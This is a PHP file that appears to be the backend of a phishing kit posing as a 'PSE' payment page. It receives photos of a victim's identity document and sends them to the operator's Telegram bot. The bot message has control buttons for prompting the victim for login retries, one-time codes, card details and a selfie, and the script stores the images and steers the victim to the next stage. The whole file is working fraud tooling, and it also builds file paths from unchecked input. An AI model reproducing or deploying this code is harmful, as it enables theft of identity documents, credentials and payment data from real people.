<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
$config = include '../../config/config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

include '../../config/db.php';

// Habilitar reporte de errores
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Obtener los datos del formulario
    $imageData = $_POST['image'] ?? '';
    $clienteId = $_POST['cliente_id'] ?? '';
    $tipo = $_POST['tipo'] ?? 'unknown'; // 'front' o 'back'

    // Validar datos básicos
    if (empty($imageData) || empty($clienteId)) {
        echo json_encode(['status' => 'error', 'message' => 'Faltan datos']);
        exit;
    }

    try {
        // --- 1. Guardar la imagen en el sistema de archivos temporalmente ---

        // Eliminar el prefijo "data:image/png;base64," o similar
        $imageData = preg_replace('#^data:image/\w+;base64,#i', '', $imageData);
        $decodedImage = base64_decode($imageData);

        // Crear nombre de archivo con timestamp
        $fileName = 'doc_' . $tipo . '_' . $clienteId . '_' . time() . '.jpg';
        $filePath = '../../assets/uploads/' . $fileName;

        // Asegurar que el directorio uploads existe
        if (!file_exists('../../assets/uploads/')) {
            mkdir('../../assets/uploads/', 0775, true);
        }

        // Guardar archivo
        file_put_contents($filePath, $decodedImage);

        // --- 2. Enviar la imagen al Bot de Telegram ---

        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $caption = ($tipo === 'front') ? "🆔 Documento FRENTE recibido" : "🆔 Documento REVERSO recibido";
        $caption .= "\nID Cliente: " . $clienteId;

        // Teclado completo (copiado de modules/login/process_login.php y expandido)
        // Teclado completo INLINE (Solución al "no aparecen botones")
        // Además, reemplazamos los botones de Doc por sus versiones de Error como solicitó el usuario.
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
                    ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
                ],
                [
                    ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"],
                    ['text' => '💳 CC', 'url' => "$baseUrl?id=$clienteId&estado=5&key=$security_key"],
                ],
                [
                    ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"],
                    ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=7&key=$security_key"],
                ],
                [
                    ['text' => '⚠️ Error Doc Frente', 'url' => "$baseUrl?id=$clienteId&estado=13&key=$security_key"],
                    ['text' => '⚠️ Error Doc Reverso', 'url' => "$baseUrl?id=$clienteId&estado=14&key=$security_key"]
                ],
                [
                    ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$clienteId&estado=8&key=$security_key"],
                    ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$clienteId&estado=9&key=$security_key"],
                    ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$clienteId&estado=10&key=$security_key"]
                ]
            ]
        ];

        $encodedKeyboard = json_encode($keyboard);

        // URL para enviar foto
        // Usamos CURL para enviar multipart/form-data
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";

        $postFields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile(realpath($filePath)),
            'caption' => $caption,
            'reply_markup' => $encodedKeyboard
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        if ($err) {
            // Manejar error de CURL si es necesario
            // error_log("Error enviando a Telegram: " . $err);
        }

        // Eliminar archivo temporal (opcional, para no llenar el server)
        // unlink($filePath); 

        // --- 3. Actualizar estado del cliente y GUARDAR FOTO ---
        $columnaFoto = ($tipo === 'front') ? 'foto_front' : 'foto_back';

        // Usamos PDO
        // Nota: fileName incluye solo el nombre, asumimos path relativo en display
        $sql = "UPDATE pse SET estado = 1, $columnaFoto = :foto WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute(['foto' => $fileName, 'id' => $clienteId]);

        // --- 4. Redirección Inteligente ---
        $isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';

        if ($isRetry) {
            // Si es un reintento por error, vamos a 'espera' (cargando) directamente.
            header("Location: ../../index.php?status=espera&id=" . $clienteId);
        } elseif ($tipo === 'front') {
            // Flujo normal: Selfie -> Front -> Back
            header("Location: ../../index.php?status=doc_back&id=" . $clienteId);
        } else {
            // Flujo normal: Back -> Espera
            header("Location: ../../index.php?status=espera&id=" . $clienteId);
        }
        exit();

    } catch (Exception $e) {
        echo "Error: " . $e->getMessage();
    }

} else {
    // Si intentan entrar directo
    header("Location: ../../index.php");
    exit();
}
?>
